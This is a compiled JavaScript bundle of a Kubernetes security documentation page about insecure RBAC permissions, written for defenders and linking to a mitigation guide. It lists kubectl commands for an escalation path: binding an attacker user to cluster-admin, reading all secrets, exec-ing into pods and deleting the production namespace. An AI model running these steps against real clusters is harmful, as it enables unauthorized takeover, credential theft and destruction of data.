"use strict";(self.webpackChunkk_8_s_security=self.webpackChunkk_8_s_security||[]).push([[3710],{2484:(e,s,n)=>{n.r(s),n.d(s,{assets:()=>o,contentTitle:()=>c,default:()=>p,frontMatter:()=>a,metadata:()=>i,toc:()=>l});const i=JSON.parse('{"id":"attack_vectors/insecure_rbac_permissions","title":"Insecure RBAC Permissions","description":"How overly permissive Kubernetes RBAC configurations enable privilege escalation and full cluster compromise.","source":"@site/docs/attack_vectors/insecure_rbac_permissions.md","sourceDirName":"attack_vectors","slug":"/attack_vectors/insecure_rbac_permissions","permalink":"/k8s_security/docs/attack_vectors/insecure_rbac_permissions","draft":false,"unlisted":false,"editUrl":"https://github.com/geek-kb/k8s_security/edit/main/docs/attack_vectors/insecure_rbac_permissions.md","tags":[],"version":"current","lastUpdatedBy":"Itai Ganot","sidebarPosition":8,"frontMatter":{"sidebar_position":8,"title":"Insecure RBAC Permissions","description":"How overly permissive Kubernetes RBAC configurations enable privilege escalation and full cluster compromise."},"sidebar":"default","previous":{"title":"Exposed Kubernetes Dashboard","permalink":"/k8s_security/docs/attack_vectors/exposed_dashboard"},"next":{"title":"Container Escape","permalink":"/k8s_security/docs/attack_vectors/privileged_container_escape"}}');var r=n(4848),t=n(8453);const a={sidebar_position:8,title:"Insecure RBAC Permissions",description:"How overly permissive Kubernetes RBAC configurations enable privilege escalation and full cluster compromise."},c="Insecure RBAC Permissions",o={},l=[{value:"Exploitation Steps: Privilege Escalation via RBAC",id:"exploitation-steps-privilege-escalation-via-rbac",level:2},{value:"Step 1: Identify RBAC Roles and Bindings",id:"step-1-identify-rbac-roles-and-bindings",level:3},{value:"Step 2: Check Impersonation Privileges",id:"step-2-check-impersonation-privileges",level:3},{value:"Step 3: Bind to Cluster Admin Role",id:"step-3-bind-to-cluster-admin-role",level:3},{value:"Step 4: Gain Full Access",id:"step-4-gain-full-access",level:3},{value:"Summary",id:"summary",level:2}];function d(e){const s={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",header:"header",hr:"hr",p:"p",pre:"pre",strong:"strong",...(0,t.R)(),...e.components};return(0,r.jsxs)(r.Fragment,{children:[(0,r.jsx)(s.header,{children:(0,r.jsx)(s.h1,{id:"insecure-rbac-permissions",children:"Insecure RBAC Permissions"})}),"\n",(0,r.jsxs)(s.p,{children:["Kubernetes uses ",(0,r.jsx)(s.strong,{children:"Role-Based Access Control (RBAC)"})," to manage who can perform which actions on which resources. When RBAC is misconfigured\u2014especially with ",(0,r.jsx)(s.strong,{children:"wildcard permissions"}),", ",(0,r.jsx)(s.strong,{children:"cluster-wide bindings"}),", or ",(0,r.jsx)(s.strong,{children:"unscoped roles"}),"\u2014an attacker can gain unauthorized access or escalate privileges to compromise the cluster."]}),"\n",(0,r.jsx)(s.hr,{}),"\n",(0,r.jsx)(s.h2,{id:"exploitation-steps-privilege-escalation-via-rbac",children:"Exploitation Steps: Privilege Escalation via RBAC"}),"\n",(0,r.jsx)(s.p,{children:"An attacker leverages excessive RBAC permissions to escalate privileges and gain administrative control over the cluster."}),"\n",(0,r.jsx)(s.h3,{id:"step-1-identify-rbac-roles-and-bindings",children:"Step 1: Identify RBAC Roles and Bindings"}),"\n",(0,r.jsx)(s.p,{children:"The attacker inspects roles, cluster roles, and their bindings using a compromised pod or low-privileged user account:"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-bash",children:"kubectl get roles,rolebindings,clusterroles,clusterrolebindings -A\n"})}),"\n",(0,r.jsxs)(s.p,{children:["They search for any role or binding that includes excessive permissions or wildcards (",(0,r.jsx)(s.code,{children:"*"}),")."]}),"\n",(0,r.jsx)(s.h3,{id:"step-2-check-impersonation-privileges",children:"Step 2: Check Impersonation Privileges"}),"\n",(0,r.jsx)(s.p,{children:"The attacker tests if they can impersonate other users\u2014especially administrators:"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-bash",children:"kubectl auth can-i '*' '*' --as=admin\n"})}),"\n",(0,r.jsxs)(s.p,{children:["If the response is ",(0,r.jsx)(s.code,{children:"yes"}),", they can act as an admin user."]}),"\n",(0,r.jsx)(s.h3,{id:"step-3-bind-to-cluster-admin-role",children:"Step 3: Bind to Cluster Admin Role"}),"\n",(0,r.jsxs)(s.p,{children:["If the attacker has permission to bind roles, they can bind themselves to the powerful ",(0,r.jsx)(s.code,{children:"cluster-admin"})," role:"]}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-bash",children:"kubectl create clusterrolebinding attacker-admin \\\n  --clusterrole=cluster-admin \\\n  --user=attacker\n"})}),"\n",(0,r.jsx)(s.p,{children:"Alternatively, they may discover an existing binding like this:"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-yaml",children:"apiVersion: rbac.authorization.k8s.io/v1\nkind: ClusterRoleBinding\nmetadata:\n  name: pwned-cluster-admin\nsubjects:\n  - kind: User\n    name: admin\n    apiGroup: rbac.authorization.k8s.io\nroleRef:\n  kind: ClusterRole\n  name: cluster-admin\n  apiGroup: rbac.authorization.k8s.io\n"})}),"\n",(0,r.jsx)(s.p,{children:"Apply it using:"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-bash",children:"kubectl apply -f pwned-cluster-admin.yaml\n"})}),"\n",(0,r.jsx)(s.h3,{id:"step-4-gain-full-access",children:"Step 4: Gain Full Access"}),"\n",(0,r.jsxs)(s.p,{children:["With ",(0,r.jsx)(s.code,{children:"cluster-admin"})," privileges, the attacker can now:"]}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-bash",children:"kubectl get secrets -A\nkubectl exec -it <pod-name> -- /bin/sh\nkubectl delete namespace production\n"})}),"\n",(0,r.jsx)(s.p,{children:"They effectively control the entire cluster."}),"\n",(0,r.jsx)(s.hr,{}),"\n",(0,r.jsx)(s.h2,{id:"summary",children:"Summary"}),"\n",(0,r.jsxs)(s.p,{children:["RBAC misconfigurations\u2014such as ",(0,r.jsx)(s.strong,{children:"wildcard permissions"}),", ",(0,r.jsx)(s.strong,{children:"unscoped bindings"}),", and ",(0,r.jsx)(s.strong,{children:"overly privileged roles"}),"\u2014can be exploited by attackers to gain full administrative access to Kubernetes clusters. These mistakes are often present in development or poorly hardened environments, making RBAC a prime target for lateral movement and privilege escalation."]}),"\n",(0,r.jsxs)(s.p,{children:["\u27a1 ",(0,r.jsx)(s.a,{href:"/docs/best_practices/cluster_setup_and_hardening/rbac_and_identity/insecure_rbac_permissions_mitigation",children:"See Mitigation Guide for Insecure RBAC Permissions"})]})]})}function p(e={}){const{wrapper:s}={...(0,t.R)(),...e.components};return s?(0,r.jsx)(s,{...e,children:(0,r.jsx)(d,{...e})}):d(e)}},8453:(e,s,n)=>{n.d(s,{R:()=>a,x:()=>c});var i=n(6540);const r={},t=i.createContext(r);function a(e){const s=i.useContext(t);return i.useMemo((function(){return"function"==typeof e?e(s):{...s,...e}}),[s,e])}function c(e){let s;return s=e.disableParentContext?"function"==typeof e.components?e.components(r):e.components||r:a(e.components),i.createElement(t.Provider,{value:s},e.children)}}}]);